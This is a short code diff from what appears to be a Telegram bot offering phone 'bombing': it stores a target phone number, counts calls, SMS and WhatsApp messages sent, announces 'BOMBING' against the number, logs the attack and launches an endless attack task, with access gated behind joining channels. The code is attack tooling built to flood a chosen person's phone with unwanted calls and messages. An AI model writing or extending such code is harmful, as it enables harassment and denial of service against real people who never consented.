@@ -1173,12 +1173,27 @@ if not await check_subscription(user_id):
     return await message.answer("🔒 Join channels first!")
 
 stop_signals[user_id] = False
-user_attacks[user_id] = ...
-attack_stats[user_id] = ...
 
-msg = await message.answer(...)
-await log_attack(...)
-asyncio.create_task(...)
+user_attacks[user_id] = {
+    'phone': number,
+    'start_time': time.time()
+}
+
+attack_stats[user_id] = {
+    'Call': 0,
+    'SMS': 0,
+    'WhatsApp': 0
+}
+
+msg = await message.answer(
+    f"<b>⚔️ BOMBING:</b> <code>{number}</code>"
+)
+
+await log_attack(user_id, number, "GROUP_CMD")
+
+asyncio.create_task(
+    run_infinite_attack(user_id, number, message.chat.id, msg.message_id)
+)
 
 @dp.message(AttackState.waiting_for_number)
 async def process_quick_attack_number(message: types.Message, state: FSMContext):
